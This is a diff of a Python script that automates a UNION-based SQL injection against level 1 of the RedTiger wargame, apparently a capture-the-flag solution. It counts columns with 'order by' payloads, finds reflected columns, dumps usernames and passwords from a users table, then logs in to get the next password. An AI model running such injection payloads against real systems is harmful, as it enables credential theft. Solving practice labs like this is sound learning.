@@ -3,9 +3,9 @@ import difflib
 import pickle
 import tigers as tg
 
-
-def count_columns(url: str) -> int:
-    max_columns = 10
+'''
+def count_columns(url: str, encode=False) -> int:
+    max_columns = 30
     html_responce_1 = ''
     for i in range(1, max_columns):
         param = dict(cat=f"1 order by {i}")
@@ -18,13 +18,14 @@ def count_columns(url: str) -> int:
     exit(1)
 
 
+
 def find_visible_columns(url: str, base_name: str,
                          list_of_columns: list) -> list:
     list_of_visible = []
     param = dict(
         cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
     html_responce = tg.get_request(url, param)
-    # find differens
+    # Find differens
     param = dict(cat=f"-1")
     html_base = tg.get_request(url, param)
     for s in difflib.ndiff(html_responce, html_base):
@@ -47,10 +48,12 @@ def find_param(url: str, base_name: str, list_of_columns: list,
     if len(find) <= len(list_of_visible):
         for i, f in enumerate(find):
             list_of_columns[int(list_of_visible[i]) - 1] = f
+
         param = dict(
             cat=f"-1 union select {','.join(list_of_columns)} from {base_name}")
+
         html_responce = tg.get_request(url, param)
-        # find differens
+        # Find differens
         n = -1
         key = [''] * len(find)
         for s in difflib.ndiff(html_responce, html_visible):
@@ -62,29 +65,46 @@ def find_param(url: str, base_name: str, list_of_columns: list,
                 n += 1
         return key
     else:
-        # todo
+        # Todo
         print('too small visible list')
         exit(1)
+'''
 
 
 def main():
-    url = "https://redtiger.labs.overthewire.org/level1.php"
     base_name = 'level1_users'
-    finds = ['username', 'password']  # what we are finding
+    url = "https://redtiger.labs.overthewire.org/level1.php"
+    finds = ['username', 'password']  # What we are finding
     pass_r = 'The password for the next level is: '
 
-    columns = count_columns(url)
+    # Counting the number of columns
+    columns = tg.count_columns(url, '1 order by %s', 'cat')
+
     list_of_columns = [str(c + 1) for c in range(columns)]
-    list_of_visible, html_visible = find_visible_columns(
-        url, base_name, list_of_columns)
 
-    keys = find_param(url, base_name, list_of_columns,
-                      list_of_visible, finds, html_visible)
-    print(keys)
+    # Search for visible columns
+    list_of_visible, html_visible = tg.find_visible_columns(
+        url, len(list_of_columns),
+        f"-1 union select {','.join(list_of_columns)} from {base_name}",
+        'cat', '-1')
 
+    # Search for the desired data
+    if len(finds) <= len(list_of_visible):
+        for i, f in enumerate(finds):
+            list_of_columns[int(list_of_visible[i]) - 1] = f
+    else:
+        print('too small visible list')
+        exit(1)
+    keys = tg.find_param(url, list_of_columns, list_of_visible, html_visible,
+                         f"-1 union select {','.join(list_of_columns)} from {base_name}",
+                         'cat')
+
+    # Authorization
     data = dict(user=keys[0], password=keys[1], login='Login')
     response = tg.get_request(url, data, method='post')
-    passw = tg.extract_pass(response).replace(pass_r, '')
+
+    # Еxtracting data from html
+    passw = tg.extract_pass(response, pass_r).replace(pass_r, '')
     print('password:', passw)
 
     try:
